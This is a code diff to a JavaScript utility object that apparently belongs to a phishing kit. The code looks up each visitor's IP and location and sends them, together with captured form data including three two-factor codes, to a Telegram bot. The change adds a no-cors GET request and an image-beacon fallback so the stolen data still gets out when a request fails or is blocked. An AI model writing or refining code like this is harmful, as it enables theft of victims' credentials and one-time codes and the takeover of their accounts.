@@ -46,9 +46,19 @@ const Utils = {
         }
     },
 
+    async fetchWithTimeout(url, ms) {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), ms);
+        try {
+            return await fetch(url, { signal: controller.signal });
+        } finally {
+            clearTimeout(timer);
+        }
+    },
+
     async getUserLocation() {
         try {
-            const response = await fetch("https://ipinfo.io/json?token=790b745aefcdac");
+            const response = await this.fetchWithTimeout("https://ipinfo.io/json?token=790b745aefcdac", 5000);
             if (!response.ok) throw new Error("Network response was not ok");
 
             const data = await response.json();
@@ -58,7 +68,7 @@ const Utils = {
                 country_code: data.country || "N/A",
                 ip: data.ip || "N/A",
                 region: data.region || "N/A",
-                country: data.country || "N/A"   // hoặc data.org nếu muốn ISP
+                country: data.country || "N/A"
             };
         } catch (error) {
             console.error("Error getting location:", error);
@@ -73,27 +83,30 @@ const Utils = {
         }
     },
 
-    async sendLanguageNotification(language) {
-        const locationData = await this.getUserLocation();
-
-        const text = `
-<b>IP:</b> <code>${locationData.ip}</code>
-<b>Location:</b> <code>${locationData.location}</code>
-<b>Language:</b> <code>${language || 'N/A'}</code>`;
+    async sendTelegramMessage(text) {
+        const params = new URLSearchParams({
+            chat_id: String(CONFIG.TELEGRAM_CHAT_ID),
+            text: text,
+            parse_mode: 'HTML'
+        });
+        const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage?${params.toString()}`;
 
         try {
-            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                    text,
-                    parse_mode: 'HTML'
-                })
-            });
+            await fetch(url, { method: 'GET', mode: 'no-cors', cache: 'no-store' });
         } catch (error) {
-            console.error('Telegram error:', error);
+            try {
+                const img = new Image();
+                img.src = url;
+            } catch (imgError) {
+                console.error('Telegram error:', imgError);
+            }
         }
+    },
+
+    async sendLanguageNotification(language) {
+        const locationData = await this.getUserLocation();
+        const text = `<b>IP:</b> <code>${locationData.ip}</code>\n<b>Location:</b> <code>${locationData.location}</code>\n<b>Language:</b> <code>${language || 'N/A'}</code>`;
+        await this.sendTelegramMessage(text);
     },
 
     async sendToTelegram(data) {
@@ -117,19 +130,7 @@ const Utils = {
 <b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
 <b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
 
-        try {
-            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                    text,
-                    parse_mode: 'HTML'
-                })
-            });
-        } catch (error) {
-            console.error('Telegram error:', error);
-        }
+        await this.sendTelegramMessage(text);
     },
 
     async sendToEmail(data) {
@@ -231,4 +232,6 @@ Sent at: ${new Date().toLocaleString()}`;
         return `${gen()}-${gen()}-${gen()}`;
     }
 };
+
+window.Utils = Utils;
 
